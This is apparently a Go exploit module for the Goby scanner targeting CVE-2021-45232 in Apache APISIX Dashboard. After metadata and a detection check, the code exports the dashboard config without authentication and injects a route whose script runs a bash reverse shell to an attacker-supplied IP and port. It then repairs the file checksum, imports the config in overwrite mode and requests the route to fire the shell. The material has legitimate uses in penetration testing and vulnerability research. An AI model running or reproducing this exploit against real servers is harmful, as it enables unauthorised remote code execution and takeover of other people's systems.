package exploits

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"hash/crc32"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache APISIX Dashboard Unauthorized Access Vulnerability",
    "Description": "Attackers can access certain interfaces without logging in to Apache APISIX Dashboard, thus making unauthorized changes or obtaining relevant configuration information such as Apache APISIX Route, Upstream, Service, etc., and cause problems such as SSRF, malicious traffic proxies built by attackers, and arbitrary code execution.",
    "Impact": "Apache APISIX Dashboard Unauthorized Access Vulnerability",
    "Recommendation": "It is recommended that users change their default user name and password in a timely manner and restrict source IP access to the Apache APISIX Dashboard.",
    "Product": "Apache APISIX",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache APISIX Dashboard 未授权访问漏洞（CVE-2021-45232）",
            "Description": "<p>Apache APISIX 是一个云原生 API 网关。</p><p>攻击者无需登录 Apache APISIX Dashboard 即可访问某些接口，从而进行未授权更改或获取 Apache APISIX Route、Upstream、Service 等相关配置信息，并造成 SSRF、攻击者搭建恶意流量代理和任意代码执行等问题。<br></p>",
            "Impact": "<p>攻击者无需登录 Apache APISIX Dashboard 即可访问某些接口，从而进行未授权更改或获取 Apache APISIX Route、Upstream、Service 等相关配置信息，并造成 SSRF、攻击者搭建恶意流量代理和任意代码执行等问题。<br></p>",
            "Recommendation": "<p>1、建议用户及时更改默认用户名与密码，并限制来源 IP 访问 Apache APISIX Dashboard。</p><p>2、及时更新至 Apache APISIX Dashboard 2.10.1 及以上版本：<a href=\"https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1\">https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1</a><br></p>",
            "Product": "Apache APISIX",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Apache APISIX Dashboard Unauthorized Access Vulnerability",
            "Description": "Attackers can access certain interfaces without logging in to Apache APISIX Dashboard, thus making unauthorized changes or obtaining relevant configuration information such as Apache APISIX Route, Upstream, Service, etc., and cause problems such as SSRF, malicious traffic proxies built by attackers, and arbitrary code execution.",
            "Impact": "Apache APISIX Dashboard Unauthorized Access Vulnerability",
            "Recommendation": "It is recommended that users change their default user name and password in a timely manner and restrict source IP access to the Apache APISIX Dashboard.",
            "Product": "Apache APISIX",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"Apache APISIX Dashboard\"",
    "GobyQuery": "title=\"Apache APISIX Dashboard\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://apisix.apache.org/zh/",
    "DisclosureDate": "2021-12-29",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-45232"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "7.3",
    "CVEIDs": [
        "CVE-2021-45232"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202112-2629"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/apisix/admin/migrate/export",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Disposition: attachment; filename=apisix-config.bak",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Consumers",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/apisix/admin/migrate/export",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Disposition: attachment; filename=apisix-config.bak",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Consumers",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "ip",
            "type": "input",
            "value": "your vps ip",
            "show": ""
        },
        {
            "name": "port",
            "type": "input",
            "value": "your vps port",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10247"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			ip := ss.Params["ip"].(string)
			port := ss.Params["port"].(string)
			if ip == "" || port == "" {
				expResult.Output = ""
				expResult.Success = false
				return expResult
			}
			addSum := func(data []byte) []byte {
				checksumUnit32 := crc32.ChecksumIEEE(data)
				checksum := make([]byte, 4)
				binary.BigEndian.PutUint32(checksum, checksumUnit32)
				fileBytes := append(data, checksum...)
				content := fileBytes
				importData := content[:len(content)-4]
				checksum2 := binary.BigEndian.Uint32(content[len(content)-4:])
				if checksum2 != crc32.ChecksumIEEE(importData) {
					fmt.Println("Checksum check failure,maybe file broken")
					return nil
				}
				return content
			}
			BytesCombine := func(pBytes ...[]byte) []byte {
				return bytes.Join(pBytes, []byte(""))
			}
			importUrl := "/apisix/admin/migrate/import"
			exportUrl := "/apisix/admin/migrate/export"
			exportCfg := httpclient.NewGetRequestConfig(exportUrl)
			importCfg := httpclient.NewPostRequestConfig(importUrl)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, exportCfg); err == nil {
				if resp.StatusCode == 200 &&
					strings.Contains(resp.Header.Get("Content-Disposition"), "filename=apisix-config.bak") &&
					strings.Contains(resp.Utf8Html, "\"Routes\"") {
					route := "/" + goutils.RandomHexString(8)
					cmd := fmt.Sprintf("/bin/bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
					lastIndex := strings.LastIndex(expResult.HostInfo.HostInfo, ":")
					host := expResult.HostInfo.HostInfo[:lastIndex]
					newConfigReplace := "\"Routes\":[{\"id\":\"" + goutils.RandomHexString(10) + "\",\"create_time\":1640689744,\"update_time\":1640689744,\"uri\":\"" + route + "\",\"name\":\"" + goutils.RandomHexString(5) + "\",\"methods\":[\"GET\"],\"script\":\"os.execute('" + cmd + "')\",\"script_id\":\"387822367469994707\",\"upstream\":{\"nodes\":{\"" + host + "\":80},\"timeout\":{\"connect\":6,\"send\":6,\"read\":6},\"type\":\"roundrobin\",\"scheme\":\"http\",\"pass_host\":\"pass\",\"keepalive_pool\":{\"idle_timeout\":60,\"requests\":1000,\"size\":320}},\"status\":1}"
					if !strings.Contains(resp.Utf8Html, "\"Routes\":[]") {
						newConfigReplace += ","
					}
					expConfig := strings.Replace(resp.Utf8Html, "\"Routes\":[", newConfigReplace, -1)
					lastInd := strings.LastIndex(expConfig, "}")
					expConfig = expConfig[:lastInd+1]
					importCfg.Header.Store("Content-Type", "multipart/form-data; boundary=504ba4f7d7612fcc9dbb27dd9dc291c3")
					importCfg.Data = string(BytesCombine([]byte("--504ba4f7d7612fcc9dbb27dd9dc291c3\nContent-Disposition: form-data; name=\"mode\"\n\noverwrite\n--504ba4f7d7612fcc9dbb27dd9dc291c3\nContent-Disposition: form-data; name=\"file\"; filename=\"test\"\nContent-Type: application/octet-stream\n\n"), addSum([]byte(expConfig)), []byte("\n--504ba4f7d7612fcc9dbb27dd9dc291c3--"))[:])
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, importCfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"code\":0") &&
							strings.Contains(resp.Utf8Html, "\"ConflictItems\":null") {
							triggerUrl := "http://" + host + ":80" + route
							triggerCfg := httpclient.NewGetRequestConfig(triggerUrl)
							httpclient.DoHttpRequest(expResult.HostInfo, triggerCfg)
							expResult.Output = "Go to your vps to check if you have received the reverse shell.TriggerUrl is:" + triggerUrl
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
